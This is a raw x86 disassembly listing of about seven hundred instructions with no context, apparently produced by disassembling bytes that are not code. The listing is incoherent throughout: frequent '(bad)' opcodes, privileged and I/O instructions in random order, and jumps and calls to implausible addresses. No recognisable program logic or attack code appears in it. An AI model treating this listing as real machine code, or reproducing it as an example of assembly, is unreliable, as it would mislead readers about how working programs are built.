  414ada:	jmp    DWORD PTR [eax+edx*1-0x4e]
  414ade:	push   ebp
  414adf:	(bad)  
  414ae0:	call   0x3248e4
  414ae5:	mov    bh,0xdb
  414ae7:	cld    
  414ae8:	or     BYTE PTR [ebp+0x45],bl
  414aeb:	(bad)  
  414aec:	call   0xff7b477c
  414af1:	add    al,BYTE PTR [ebp+0x37]
  414af4:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  414afa:	jne    0x414afc
  414afc:	(bad)  
  414afd:	cmp    edi,esp
  414aff:	jne    0x414b32
  414b01:	mov    edi,edi
  414b03:	or     BYTE PTR [ebx-0x307f0b49],cl
  414b09:	pop    ds
  414b0a:	into   
  414b0b:	je     0x414ace
  414b0d:	mov    ebx,DWORD PTR [esi]
  414b0f:	or     BYTE PTR [ebp-0x49],al
  414b12:	mov    esp,DWORD PTR [esi-0x77]
  414b15:	mov    esi,0x4451f0c
  414b1a:	mov    eax,DWORD PTR [eax]
  414b1c:	or     al,0x66
  414b1e:	sar    bl,0x3b
  414b21:	xor    esi,DWORD PTR [ebp+0x66]
  414b24:	xor    ecx,edi
  414b26:	pop    edi
  414b27:	adc    bl,BYTE PTR [ebx+0x70]
  414b2a:	ret    0xff
  414b2d:	cld    
  414b2e:	inc    ebp
  414b2f:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  414b35:	cld    
  414b36:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  414b3d:	push   0xffffff83
  414b3f:	pop    edi
  414b40:	or     BYTE PTR [ebp+0x53],dh
  414b43:	xorps  xmm1,xmm2
  414b46:	test   BYTE PTR [eax+eax*1],bh
  414b49:	add    BYTE PTR [eax],al
  414b4b:	adc    eax,eax
  414b4d:	add    DWORD PTR [eax+esi*2-0xff7b00],0xffffffb7
  414b55:	jmp    DWORD PTR [eax]
  414b57:	ror    al,0x5e
  414b5a:	inc    ebp
  414b5b:	leave  
  414b5c:	xor    ecx,DWORD PTR [eax]
  414b5e:	and    DWORD PTR [ebx-0x3ec10708],ecx
  414b64:	add    ah,al
  414b66:	xor    edi,edi
  414b68:	xor    DWORD PTR [ebx],0x66003304
  414b6e:	mov    DWORD PTR [ebp-0xc],ecx
  414b71:	pcmpgtw mm0,mm0
  414b74:	add    dl,ah
  414b76:	leave  
  414b77:	mov    edi,DWORD PTR [esi-0x7d]
  414b7a:	push   ax
  414b7c:	dec    ebp
  414b7d:	mov    esi,DWORD PTR [ebx-0x75]
  414b80:	lea    ebp,[eax-0x7c00ff04]
  414b86:	xor    eax,DWORD PTR [eax]
  414b88:	sysret 
  414b8a:	dec    ebp
  414b8b:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  414b92:	push   WORD PTR [ecx+0x8]
  414b96:	jne    0x414b59
  414b98:	ud0    ecx,DWORD PTR [ecx]
  414b9b:	mov    eax,edx
  414b9d:	lods   al,BYTE PTR ds:[esi]
  414b9e:	add    BYTE PTR [eax],al
  414ba0:	data16 (bad) 
  414ba2:	iret   
  414ba3:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  414baa:	cli    
  414bab:	inc    ebp
  414bac:	cmp    al,0x8d
  414bae:	add    BYTE PTR [esi+0x2d],ah
  414bb1:	inc    ebp
  414bb2:	pop    ebp
  414bb3:	lea    ecx,[edi]
  414bb5:	mov    dl,bh
  414bb7:	add    BYTE PTR [edi],cl
  414bb9:	mov    DWORD PTR [eax+eax*8],edi
  414bbc:	mov    ebx,0x3b87
  414bc1:	add    BYTE PTR [ebx],ch
  414bc3:	inc    ebp
  414bc4:	data16 (bad) 
  414bc6:	clc    
  414bc7:	int3   
  414bc8:	cmp    eax,DWORD PTR [eax]
  414bca:	je     0x414b55
  414bcc:	push   0xffffffc8
  414bce:	pop    edi
  414bcf:	xchg   DWORD PTR [ebp+0x0],eax
  414bd2:	data16 add BYTE PTR [ebp+0x45],cl
  414bd6:	lea    cx,[ebp+0x10]
  414bda:	jb     0x414bdc
  414bdc:	jmp    0x414b67
  414bde:	call   eax
  414be0:	clc    
  414be1:	xchg   DWORD PTR [edi+0x1],edi
  414be4:	mov    eax,DWORD PTR [eax]
  414be6:	or     BYTE PTR [ebp-0x49],al
  414be9:	lea    eax,[eax+0x74003154]
  414bef:	push   edi
  414bf0:	inc    edx
  414bf1:	jge    0x414bf2
  414bf3:	mov    DWORD PTR [edi],ecx
  414bf5:	fdiv   DWORD PTR [edi-0x6]
  414bf8:	inc    DWORD PTR [eax]
  414bfa:	xor    edx,DWORD PTR [eax+0x5f]
  414bfd:	xchg   DWORD PTR [ebx+0x1],ebx
  414c00:	ret    0x0
  414c03:	xor    BYTE PTR [ebp-0x51],cl
  414c06:	cmp    edi,0xf0ff89fc
  414c0c:	data16 ror al,0x84
  414c10:	rol    BYTE PTR [eax],0x3b
  414c13:	add    al,dh
  414c15:	dec    eax
  414c16:	xchg   esp,eax
  414c17:	push   ebx
  414c18:	jmp    0x414ba5
  414c1a:	push   ebp
  414c1b:	add    esp,ebp
  414c1d:	add    ebp,esp
  414c1f:	mov    edx,DWORD PTR [edi+0x24]
  414c22:	clc    
  414c23:	dec    esi
  414c24:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  414c2a:	cmp    BYTE PTR [ebx],al
  414c2c:	jne    0x414bb7
  414c2e:	xor    esp,eax
  414c30:	jmp    0x444db3
  414c35:	add    ebp,DWORD PTR [ecx+ecx*4]
  414c38:	jne    0x414c2e
  414c3a:	call   0xffcb4994
  414c3f:	clc    
  414c40:	xchg   edi,eax
  414c41:	sti    
  414c42:	add    DWORD PTR [ebx],eax
  414c44:	add    BYTE PTR [ebp+0x47],bl
  414c47:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  414c4d:	pop    ebp
  414c4e:	mov    DWORD PTR [esi-0x48],esi
  414c51:	jmp    0x414c9a
  414c53:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  414c59:	(bad)  
  414c5b:	cmp    al,0x0
  414c5d:	cmp    eax,DWORD PTR [ebp+0x18]
  414c60:	lea    ebx,[ebp-0x56]
  414c63:	jle    0x414c65
  414c65:	jae    0x414bf0
  414c67:	mov    eax,esp
  414c69:	call   0xb900:0x8b005587
  414c70:	inc    ebp
  414c71:	push   ebp
  414c72:	lea    ecx,[ebp-0x27ff4f12]
  414c78:	mov    eax,edi
  414c7a:	int3   
  414c7b:	push   ebp
  414c7c:	xchg   edi,eax
  414c7e:	add    esp,ebp
  414c80:	add    BYTE PTR [eax],al
  414c82:	inc    ebp
  414c83:	add    BYTE PTR [ebp+0x8b3255],cl
  414c89:	cld    
  414c8a:	mov    DWORD PTR [edx],edi
  414c8c:	aam    0x75
  414c8e:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  414c94:	mov    DWORD PTR [ebx-0x50],edx
  414c97:	test   BYTE PTR [ebp-0x1],0xe8
  414c9b:	mov    eax,DWORD PTR [eax]
  414c9d:	hlt    
  414c9e:	add    al,al
  414ca0:	mov    eax,DWORD PTR ds:0x890045a8
  414ca6:	dec    DWORD PTR [ebx+0x45fdf0e8]
  414cac:	inc    DWORD PTR [eax*2+0xf75854d]
  414cb3:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  414cb9:	call   0x7297a9fa
  414cbe:	je     0x414d1e
  414cc0:	js     0x414d21
  414cc2:	lock ret 0x7e
  414cc6:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  414ccc:	mov    edi,edi
  414cce:	sbb    al,bl
  414cd0:	clc    
  414cd1:	add    BYTE PTR [ebp-0x73],bh
  414cd4:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  414cda:	ror    BYTE PTR [eax],1
  414cdc:	dec    ebp
  414cdd:	xchg   ebp,eax
  414cde:	mov    edi,edi
  414ce0:	in     al,0x8b
  414ce2:	jge    0x414c6d
  414ce4:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  414cea:	clc    
  414ceb:	pop    esi
  414cec:	fist   DWORD PTR [ebp+0x5d398b5d]
  414cf2:	clc    
  414cf3:	add    al,0x6e
  414cf5:	mov    eax,DWORD PTR [ebx]
  414cf7:	mov    BYTE PTR [ebp+0x0],dl
  414cfa:	mov    edx,DWORD PTR [ebx-0x20]
  414cfd:	adc    esi,DWORD PTR [edi+0x5e005f3e]
  414d03:	add    eax,0x3b3b73
  414d08:	adc    al,0x89
  414d0a:	pop    eax
  414d0b:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  414d0f:	ret    0xf08
  414d12:	cmp    al,0x2
  414d14:	mov    edx,eax
  414d16:	cld    
  414d17:	add    BYTE PTR [ebp+0x66],dl
  414d1a:	add    eax,ebx
  414d1c:	add    esp,eax
  414d1e:	sub    eax,eax
  414d20:	or     BYTE PTR [ecx-0x77f474bb],cl
  414d26:	add    BYTE PTR [eax],al
  414d28:	mov    DWORD PTR [ebx-0x24],ebx
  414d2b:	push   edi
  414d2c:	push   ebp
  414d2d:	clc    
  414d2e:	add    DWORD PTR [esi+0x1b0100],0x45
  414d35:	out    0xff,eax
  414d37:	add    edx,DWORD PTR [eax]
  414d39:	jmp    0x414d23
  414d3b:	cmp    ch,0x47
  414d3e:	(bad)  
  414d3f:	jmp    0x40c6d591
  414d44:	je     0x414cd0
  414d46:	mov    eax,DWORD PTR [eax-0x10c78f04]
  414d4c:	inc    ebp
  414d4d:	add    BYTE PTR [ebx-0x770375],al
  414d53:	add    ah,ch
  414d55:	add    edx,esp
  414d57:	pop    edi
  414d58:	pop    ebp
  414d59:	push   ebp
  414d5a:	inc    ebx
  414d5b:	in     al,dx
  414d5c:	pop    ebp
  414d5d:	in     al,dx
  414d5e:	cmp    edx,DWORD PTR [edi-0x8]
  414d61:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  414d68:	add    al,0x47
  414d6a:	push   ebp
  414d6b:	mov    esp,ebp
  414d6d:	in     al,0x45
  414d6f:	dec    ebp
  414d70:	push   esi
  414d71:	test   DWORD PTR [eax+0xfb010f],esi
  414d77:	add    BYTE PTR [eax+0xc018b],dh
  414d7d:	leave  
  414d7e:	inc    ebp
  414d7f:	test   al,ch
  414d81:	add    dh,bh
  414d83:	add    bh,bh
  414d85:	dec    ebp
  414d86:	push   cs
  414d87:	mov    DWORD PTR [ecx],eax
  414d89:	hlt    
  414d8a:	push   es
  414d8b:	dec    ebp
  414d8c:	leave  
  414d8d:	mov    DWORD PTR [eax],ecx
  414d8f:	clc    
  414d90:	cmovge eax,ecx
  414d93:	mov    ecx,0x85c2f0
  414d99:	clc    
  414d9a:	pop    DWORD PTR [ebp+0x1]
  414d9d:	push   ebx
  414d9e:	add    BYTE PTR [ebp-0x15],bh
  414da1:	push   esi
  414da2:	xor    eax,0x898a45
  414da7:	cld    
  414da8:	add    al,0x45
  414daa:	add    BYTE PTR [ebx],dh
  414dac:	pushfw 
  414dae:	add    DWORD PTR [esi+0x78308c1],edi
  414db4:	add    ah,BYTE PTR [edi+esi*4-0x33]
  414db8:	mov    ebx,0xc4e8b
  414dbd:	(bad)  
  414dbe:	cmp    ecx,ebx
  414dc0:	jne    0x414d8a
  414dc2:	xor    ecx,DWORD PTR [ebp+0x66]
  414dc5:	jmp    0xc84dcb
  414dca:	add    DWORD PTR [ebp+0x0],eax
  414dcd:	mov    eax,ebx
  414dcf:	or     al,0x8b
  414dd1:	(bad)  
  414dd2:	mov    ecx,esi
  414dd4:	mov    BYTE PTR [eax+eax*1+0x664c138],cl
  414ddb:	mov    eax,edi
  414ddd:	or     BYTE PTR [edx],cl
  414ddf:	shl    cl,cl
  414de1:	icebp  
  414de2:	add    BYTE PTR [ebp+0x37],0x8b
  414de6:	or     BYTE PTR [edx+eax*2],cl
  414de9:	(bad)  
  414dea:	or     cl,dh
  414dec:	stc    
  414ded:	shl    DWORD PTR [ebp-0x30],0xc6
  414df1:	xor    al,0x0
  414df3:	inc    ebp
  414df4:	xchg   BYTE PTR [ebx],al
  414df6:	add    esp,edi
  414df8:	add    BYTE PTR [ebp-0x39],cl
  414dfb:	mov    al,bl
  414dfd:	test   DWORD PTR [ebx+0x1c348375],ecx
  414e03:	sub    al,0xbf
  414e05:	jmp    0x414d8c
  414e07:	mov    edi,eax
  414e09:	lock jge 0x414dfd
  414e0c:	lea    esi,[edx-0x74bad501]
  414e12:	mov    ebp,esp
  414e14:	or     cl,dh
  414e16:	leave  
  414e17:	add    al,BYTE PTR [eax+eax*4-0x37ff9c00]
  414e1e:	dec    ebp
  414e1f:	dec    ebp
  414e20:	test   DWORD PTR [ebx],eax
  414e22:	paddb  mm6,mm0
  414e25:	add    DWORD PTR [eax],eax
  414e27:	dec    ebp
  414e28:	mov    ecx,DWORD PTR [ebx-0x63b217f0]
  414e2e:	mov    esi,DWORD PTR [edx]
  414e30:	or     al,0x2b
  414e32:	dec    ebp
  414e33:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  414e39:	mov    esp,esi
  414e3b:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  414e42:	mov    DWORD PTR [ebx],ebp
  414e44:	call   0xc74d774
  414e49:	mov    DWORD PTR [ebp+0x10],ecx
  414e4c:	(bad)  
  414e4d:	push   0x8b85ff10
  414e52:	clc    
  414e53:	or     al,0x55
  414e55:	(bad)  
  414e56:	push   ecx
  414e57:	retf   
  414e58:	mov    ebx,0xff4d8dc8
  414e5d:	mov    DWORD PTR [ebp+0x8],eax
  414e60:	xor    eax,DWORD PTR [ebp-0x75]
  414e63:	cmp    ebp,DWORD PTR [ebx]
  414e65:	lsl    ebx,WORD PTR [edi-0x8]
  414e69:	call   DWORD PTR [ebx-0x741bff75]
  414e6f:	(bad)  
  414e70:	or     al,0x5b
  414e72:	dec    ebp
  414e73:	or     BYTE PTR [ebx],dh
  414e75:	inc    ebp
  414e76:	xor    esi,DWORD PTR ds:0x708088d
  414e7c:	in     eax,0x9c
  414e7e:	add    BYTE PTR [edx],dh
  414e80:	inc    ebp
  414e81:	pop    edi
  414e82:	xor    eax,edx
  414e84:	test   DWORD PTR [eax],0x83108b8b
  414e8a:	dec    ebp
  414e8b:	adc    al,0x33
  414e8d:	inc    ebp
  414e8e:	xor    esi,DWORD PTR [ecx]
  414e90:	sub    ebx,DWORD PTR [ebx+edi*1-0x74038a39]
  414e97:	test   DWORD PTR [eax],ecx
  414e99:	clc    
  414e9a:	inc    ebp
  414e9b:	add    ecx,DWORD PTR [ebx+0xc7f445]
  414ea1:	hlt    
  414ea2:	leave  
  414ea3:	test   DWORD PTR [esi],eax
  414ea5:	clc    
  414ea6:	inc    edi
  414ea7:	push   edi
  414ea8:	aaa    
  414ea9:	inc    ebp
  414eaa:	pop    ss
  414eab:	ror    DWORD PTR [ebp-0x29],1
  414eae:	or     BYTE PTR [ebx+0x4d64fc55],0xd1
  414eb5:	mov    eax,0x780084d
  414eba:	push   ebp
  414ebb:	clc    
  414ebc:	ret    0xe99c
  414ebf:	xor    dl,dl
  414ec1:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  414ec7:	js     0x887dac6
  414ecd:	dec    ebp
  414ece:	push   ebp
  414ecf:	mov    edi,DWORD PTR [eax+0xc872fc]
  414ed5:	lock enter 0xceca,0xf2
  414eda:	retf   0x18ce
  414edd:	jne    0x414f2c
  414edf:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  414ee5:	enter  0xf0d6,0xca
  414ee9:	retf   0xf2c8
  414eec:	into   
  414eed:	out    dx,al
  414eee:	dec    ebp
  414eef:	dec    ebp
  414ef0:	jmp    0xff454e28
  414ef5:	xor    eax,DWORD PTR [ebp-0x15]
  414ef8:	xor    esi,DWORD PTR [ebx]
  414efa:	mov    esi,DWORD PTR [ebx]
  414efc:	sub    eax,DWORD PTR [ebx]
  414efe:	add    eax,DWORD PTR [ebx]
  414f00:	or     bl,dl
  414f02:	dec    ebp
  414f03:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  414f09:	xor    eax,DWORD PTR [ebp-0xf00073]
  414f0f:	jb     0x414f56
  414f11:	add    BYTE PTR [ebx],dh
  414f13:	dec    ebp
  414f14:	pop    esi
  414f15:	mov    ebp,ebx
  414f17:	cld    
  414f18:	mov    esi,eax
  414f1a:	call   0x520fa4e7
  414f1f:	stc    
  414f20:	add    eax,0x4572aa
  414f25:	pop    edi
  414f26:	leave  
  414f27:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  414f2e:	in     al,dx
  414f2f:	mov    eax,edi
  414f31:	xor    eax,0xf8008520
  414f37:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  414f3e:	mov    eax,DWORD PTR [ebp-0x77]
  414f41:	xor    al,bh
  414f43:	pushf  
  414f44:	inc    ebp
  414f45:	(bad)  
  414f46:	cmp    eax,ebp
  414f48:	pushf  
  414f49:	xchg   BYTE PTR [esi-0x8],dl
  414f4c:	mov    edi,0x8518e4ec
  414f52:	jmp    0xf056:0x8b457df8
  414f59:	push   ebp
  414f5a:	push   ebp
  414f5b:	push   ecx
  414f5c:	push   ecx
  414f5d:	push   edi
  414f5e:	xor    eax,esi
  414f60:	mov    edx,0x32729c
  414f65:	add    ecx,eax
  414f67:	mov    edx,edi
  414f69:	clc    
  414f6a:	retf   0xaf45
  414f6d:	cmp    ebx,ebp
  414f6f:	pushf  
  414f70:	mov    eax,edi
  414f72:	clc    
  414f73:	cld    
  414f74:	jne    0x414f8e
  414f76:	xor    ebp,edx
  414f78:	xor    eax,DWORD PTR [ebp+0x3]
  414f7b:	or     BYTE PTR [ebx],al
  414f7d:	add    BYTE PTR [ebp-0x7747475],al
  414f83:	hlt    
  414f84:	dec    ebp
  414f85:	dec    ebp
  414f86:	je     0x414fbb
  414f88:	xor    esi,DWORD PTR [ebx]
  414f8a:	xor    eax,DWORD PTR [ebx]
  414f8c:	add    eax,DWORD PTR [ebx]
  414f8e:	add    ecx,DWORD PTR [edi]
  414f90:	rol    ecx,cl
  414f92:	mov    esi,DWORD PTR [ecx]
  414f94:	in     al,dx
  414f95:	inc    ebp
  414f96:	enter  0xca2b,0x33
  414f9a:	icebp  
  414f9b:	mov    DWORD PTR [edx],ecx
  414f9d:	clc    
  414f9e:	lock pop ebp
  414fa0:	enter  0xf2e8,0xfe
  414fa4:	retf   0xeeff
  414fa7:	inc    ebp
  414fa8:	jne    0x414f35
  414faa:	mov    edi,eax
  414fac:	cld    
  414fad:	dec    ebp
  414fae:	enter  0xbc89,0x8d
  414fb2:	pushf  
  414fb3:	sti    
  414fb4:	xor    bh,bh
  414fb6:	mov    eax,DWORD PTR [ebp-0xc]
  414fb9:	mov    esi,DWORD PTR [ebp-0x4]
  414fbc:	xor    eax,esi
  414fbe:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9c]
  414fc5:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  414fcb:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  414fd1:	(bad)  
  414fd2:	push   ebp
  414fd3:	shr    esp,0x4d
  414fd6:	in     al,dx
  414fd7:	cmp    eax,DWORD PTR [esi+esi*2]
  414fda:	add    BYTE PTR [ebx-0x39ce1bbb],cl
  414fe0:	pushf  
  414fe1:	mov    edi,0x85c7f445
  414fe7:	call   0xf886d6e4
  414fec:	xor    ebx,ebx
  414fee:	pushf  
  414fef:	popa   
  414ff0:	push   ebx
  414ff1:	dec    ebp
  414ff2:	inc    ebp
  414ff3:	mov    esi,DWORD PTR [esi]
  414ff5:	clc    
  414ff6:	pushf  
  414ff7:	into   
  414ff8:	mov    ecx,edi
  414ffa:	in     al,dx
  414ffb:	call   0x8b4995be
  415000:	pop    es
  415001:	or     BYTE PTR [ebx],dh
  415003:	or     BYTE PTR [edi+0x8a724d],bh
  415009:	or     eax,edi
  41500b:	push   ebp
  41500c:	inc    ebp
  41500d:	cmpxchg8b (bad)
  41500e:	(bad)  
  41500f:	leave  
  415010:	loopne 0x414fdc
  415012:	test   DWORD PTR [ebp-0x8],ecx
  415015:	mov    eax,DWORD PTR [ebp-0x18]
  415018:	rcl    DWORD PTR [ebp-0x29],1
  41501b:	xor    eax,edi
  41501d:	add    esi,eax
  41501f:	and    eax,DWORD PTR [eax]
  415021:	mov    eax,DWORD PTR [eax]
  415023:	(bad)  
  415024:	leave  
  415025:	sti    
  415026:	inc    ebp
  415027:	dec    DWORD PTR [ebx-0x39cc13ab]
  41502d:	mov    esi,ecx
  41502f:	clc    
  415030:	(bad)  
  415031:	dec    ebp
  415032:	iret   
  415033:	xor    ebp,DWORD PTR [edi-0x74f71473]
  415039:	jb     0x415037
  41503b:	add    bh,al
  41503d:	inc    ebp
  41503e:	(bad)  
  41503f:	mov    eax,DWORD PTR [ebp-0xc]
  415042:	(bad)  
  415043:	xabort 0x64
  415046:	loopne 0x415015
  415048:	jmp    FWORD PTR [ebx]
  41504a:	mov    DWORD PTR [ebx],eax
  41504c:	clc    
  41504d:	lock inc ebp
  41504f:	dec    ebp
  415050:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  415056:	loopne 0x41508b
  415058:	inc    DWORD PTR [ebx]
  41505a:	mov    edi,DWORD PTR [ebx]
  41505c:	hlt    
  41505d:	jne    0x4150ac
  41505f:	mov    esi,DWORD PTR [ebx]
  415061:	in     al,0x8d
  415063:	dec    ebp
  415064:	or     BYTE PTR [ebx],dh
  415066:	jb     0x41506b
  415068:	add    BYTE PTR [edi+0x45],bl
  41506b:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  415071:	add    BYTE PTR [ebx],dh
  415073:	mov    esi,DWORD PTR [ebx]
  415075:	sub    DWORD PTR [ebx],0x6c
  415078:	mov    eax,DWORD PTR [ebp-0x4]
  41507b:	xor    eax,ecx
  41507d:	pushf  
  41507e:	mov    ecx,0x338545ba
  415083:	clc    
  415084:	add    edx,DWORD PTR [ebp-0x77]
  415087:	mov    edi,eax
  415089:	adc    al,0x45
  41508b:	inc    ebp
  41508c:	mov    ebx,DWORD PTR ss:[esp+edx*1+0x1eb808b]
  415094:	mov    eax,DWORD PTR [eax]
  415096:	loopne 0x4150e5
  415098:	inc    ebp
  415099:	mov    esi,DWORD PTR [ebx]
  41509b:	mov    eax,DWORD PTR [ebx]
  41509d:	nop
  41509e:	rol    DWORD PTR [eax],cl
  4150a0:	mov    DWORD PTR [ebx+0x3c4503fc],ecx
  4150a6:	mov    cl,BYTE PTR [ecx+0x450bf888]
  4150ac:	dec    ebp
  4150ad:	push   esi
  4150ae:	mov    edi,DWORD PTR [edi+0x7b608f8]
  4150b4:	xor    eax,edi
  4150b6:	mov    DWORD PTR [eax+ecx*1-0x74fcb2ce],ebx
  4150bd:	mov    DWORD PTR [eax],ecx
  4150bf:	in     al,dx
  4150c0:	into   
  4150c1:	inc    ebp
  4150c2:	iret   
  4150c3:	xor    ecx,edx
  4150c5:	add    ecx,DWORD PTR [ecx+ecx*4+0x45fff4e0]
  4150cc:	mov    ecx,DWORD PTR [ebx-0x1735af04]
  4150d2:	dec    ebp
  4150d3:	mov    DWORD PTR [ebx-0x31ba0b2c],ecx
  4150d9:	mov    eax,DWORD PTR [eax+edi*1+0x48324d9c]
  4150e0:	mov    DWORD PTR [ecx+0x8],eax
  4150e3:	mov    eax,DWORD PTR [ebp-0x8]
  4150e6:	xor    ebx,DWORD PTR [eax]
  4150e8:	mov    ecx,0xff8b8d40
  4150ed:	clc    
  4150ee:	enter  0x4d49,0x48
  4150f2:	mov    eax,edx
  4150f4:	lock enter 0x4545,0x8b
  4150f9:	mov    esi,eax
  4150fb:	cmp    dh,al
  4150fd:	rol    edi,0x3
  415100:	enter  0x9140,0x89
  415104:	inc    ebp
  415105:	adc    al,0x8b
  415107:	inc    ebp
  415108:	clc    
  415109:	xor    eax,esi
  41510b:	add    eax,edi
  41510d:	mov    DWORD PTR [esi-0x24],ebx
  415110:	rol    DWORD PTR [ebp-0x37],0x33
  415114:	add    al,0x3
  415116:	push   ebp
  415117:	mov    esp,ebp
  415119:	fsubr  st,st(4)
  41511b:	inc    ebp
  41511c:	(bad)  
  41511d:	mov    edi,esp
  41511f:	adc    BYTE PTR [ebp+0x30c3f8c7],al
  415125:	add    DWORD PTR [ebp+edx*2-0x27173877],ebx
  41512c:	inc    ebp
  41512d:	test   DWORD PTR [ecx+0x454514f8],ecx
  415133:	xor    cl,BYTE PTR [ebx+0xc7909c]
  415139:	fmul   DWORD PTR [ebx+0xf81485]
  41513f:	test   DWORD PTR [ecx+0x8b0100],ecx
  415145:	cld    
  415146:	or     edi,eax
  415148:	dec    eax
  415149:	ret    
  41514a:	push   ebx
  41514b:	inc    ebp
  41514c:	dec    ebp
  41514d:	mov    ecx,DWORD PTR [ebx+0x5745fc14]
  415153:	mov    DWORD PTR [ebp-0x14],edx
  415156:	push   ecx
  415157:	jne    0x41518c
  415159:	mov    edi,DWORD PTR [ebx+0x4d720c]
  41515f:	call   0xff874327
  415164:	mov    eax,DWORD PTR [ebp-0x4]
  415167:	mov    edi,0x4585c3d8
  41516d:	clc    
  41516e:	mov    eax,DWORD PTR [ebp-0x8]
  415171:	xor    eax,DWORD PTR [eax+0x3]
  415174:	adc    DWORD PTR [eax+0xc],0x45
  415178:	inc    ebp
  415179:	push   eax
  41517a:	mov    ebx,ebp
  41517c:	clc    
  41517d:	inc    DWORD PTR [eax-0x75]
  415180:	mov    esi,eax
  415182:	clc    
  415183:	rol    BYTE PTR [ebp+0x4545544e],0x33
  41518a:	je     0x41518f
  41518c:	mov    edx,DWORD PTR [eax+0x38]
  41518f:	jne    0x4151de
  415191:	lea    ecx,[ebx-0x817ab44]
  415197:	mul    BYTE PTR [ebx]
  415199:	dec    DWORD PTR [ebx+0x4089f845]
  41519f:	fadd   DWORD PTR [ebx]
  4151a1:	inc    ebp
  4151a2:	jmp    0x41512f
  4151a4:	mov    ecx,DWORD PTR [esp+edx*2]
  4151a7:	rol    DWORD PTR [ebp+0x45],0x8b
  4151ab:	mov    edi,esp
  4151ad:	lock (bad) 
  4151af:	dec    ebp
  4151b0:	ret    
  4151b1:	mov    eax,DWORD PTR [ebp+0x10]
  4151b4:	mov    eax,DWORD PTR [ecx-0x4]
  4151b7:	mov    eax,edi
  4151b9:	fadd   st,st(3)
  4151bb:	enter  0x1645,0x8b
  4151bf:	inc    ebp
  4151c0:	cld    
  4151c1:	mov    ecx,DWORD PTR [ebp+0xc]
  4151c4:	xor    ecx,DWORD PTR [ebp+0x3]
  4151c7:	add    ecx,DWORD PTR [ecx-0x27b276f8]
  4151cd:	sub    eax,DWORD PTR [ebp-0x17]
  4151d0:	xor    eax,DWORD PTR [edx]
  4151d2:	pushf  
  4151d3:	add    bh,al
  4151d5:	or     al,0xd8
  4151d7:	jne    0x41515e
  4151d9:	(bad)  
  4151da:	clc    
  4151db:	mov    al,0x45
  4151dd:	call   0xffde481f
  4151e2:	jmp    0xdd5518
  4151e7:	mov    DWORD PTR [ebp-0x30],eax
  4151ea:	xor    eax,DWORD PTR [ebp+0x3]
  4151ed:	xor    BYTE PTR [ecx+0x45c7f49c],cl
  4151f3:	enter  0x8503,0xc
  4151f7:	clc    
  4151f8:	inc    ebp
  4151f9:	inc    ebp
  4151fa:	push   DWORD PTR [edx]
  4151fc:	in     al,dx
  4151fd:	pushf  
  4151fe:	jne    0x41518d
  415200:	mov    edx,eax
  415202:	clc    
  415203:	dec    ebp
  415204:	out    dx,eax
  415205:	(bad)  
  415206:	dec    esp
  415208:	mov    DWORD PTR [ebp-0x10],ecx
  41520b:	lea    eax,[ebp-0x38]
  41520e:	cmp    DWORD PTR [ebp-0x64],ecx
  415211:	lea    ecx,[ebx-0x38b2273c]
  415217:	mov    eax,ebx
  415219:	cld    
  41521a:	(bad)  
  41521b:	iret   
  41521c:	mov    esp,0xf74de8cb
  415221:	jmp    0x865425
  415226:	test   DWORD PTR [ebx],esi
  415228:	je     0x4151c6
  41522a:	mov    ecx,DWORD PTR [edi]
  41522c:	fdivr  st,st(6)
  41522e:	mov    DWORD PTR [eax],0xe8ff8bc3
  415234:	lock iret 
  415236:	inc    ebp
  415237:	lock push eax
  415239:	retf   
  41523a:	imul   ecx,DWORD PTR [ebp-0x1],0xecd88b8b
  415241:	test   DWORD PTR [ebp-0x7c],0x32d89c8b
  415248:	dec    ebp
  415249:	mov    DWORD PTR [ebx],ebp
  41524b:	fmul   DWORD PTR [ecx+0x458bd845]
  415251:	fmul   DWORD PTR [ebx+0x40c3f0c7]
  415257:	enter  0x1303,0xc
  41525b:	inc    ebp
  41525c:	dec    ebp
  41525d:	xor    edi,DWORD PTR [ebx]
  41525f:	add    esi,DWORD PTR [edx+0x50]
  415262:	mov    ecx,DWORD PTR [eax+esi*8]
  415265:	inc    ebp
  415266:	inc    eax
  415267:	push   eax
  415268:	mov    ebp,esp
  41526a:	lock inc DWORD PTR [ecx-0x75]
  41526e:	mov    esp,esp
  415270:	fadd   DWORD PTR [eax]
  415272:	rol    edi,0xee
  415275:	test   BYTE PTR [eax],al
  415277:	dec    esp
  415278:	push   0x32
  41527a:	dec    DWORD PTR [ebx-0x30ba0314]
  415280:	push   eax
  415281:	mov    dh,0x21
  415283:	add    edi,edi
  415285:	cmp    edi,DWORD PTR [eax-0x7877af1]
  41528b:	add    BYTE PTR [ebp-0x75],al
  41528e:	(bad)  
  41528f:	loopne 0x41525d
  415291:	add    BYTE PTR [ebp+0x4584f8c7],al
  415297:	dec    esp
  415298:	xor    esi,DWORD PTR [edx]
  41529a:	pushf  
  41529b:	mov    eax,edi
  41529d:	cld    
  41529e:	(bad)  
  41529f:	iret   
  4152a0:	test   DWORD PTR [esi+0x3b4d03f8],esi
  4152a6:	mov    DWORD PTR [edi],ecx
  4152a8:	in     al,0x58
  4152aa:	dec    ebp
  4152ab:	add    BYTE PTR [ecx+0x4df0e08b],cl
